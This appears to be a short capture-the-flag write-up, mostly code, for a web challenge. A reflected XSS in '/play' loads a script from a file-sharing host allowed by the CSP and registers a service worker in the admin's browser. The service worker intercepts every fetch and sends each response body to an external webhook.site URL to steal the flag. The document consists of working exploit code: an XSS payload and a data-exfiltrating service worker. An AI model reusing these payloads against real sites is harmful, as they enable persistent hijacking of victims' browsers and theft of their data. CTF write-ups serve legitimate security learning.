# XSS
The reflected XSS in `/play` can be used to run a script from a file shared with the admin (allowed by the CSP).

The XSS is used to register a service worker in the admin browser.

```
<script>
navigator.serviceWorker.register('https://filesharing.m0lec.one/upload/e81c51506d9b4e4ca5d609ed0f6e4fe3');
window.setTimeout(()=>document.location = 'https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff',500);
</script>
```

# Service worker

Example of service worker to exfiltrate the flag

```
self.addEventListener('fetch', (e) => {
  e.respondWith(
    caches.match(e.request).then((r) => {
      return r || fetch(e.request).then((response) => {

        console.log(response);
        console.log(new Map(response.headers));

        const newHeaders = new Headers();

        const anotherResponse = new Response(response.body, {
          status: response.status,
          statusText: response.statusText,
          headers: newHeaders
        });


        clone = anotherResponse.clone()
        clone.text().then((x)=>fetch('https://webhook.site/9cf73d0f-160a-4f23-a986-70f1bc21b864/'+x).then((r)=>console.log(r)));


        console.log(new Map(anotherResponse.headers));


        return caches.open('static').then(
          (cache) => {
            cache.put(e.request,
              anotherResponse.clone());
            return anotherResponse;
          }
        );
      });
    })
  );
});

```
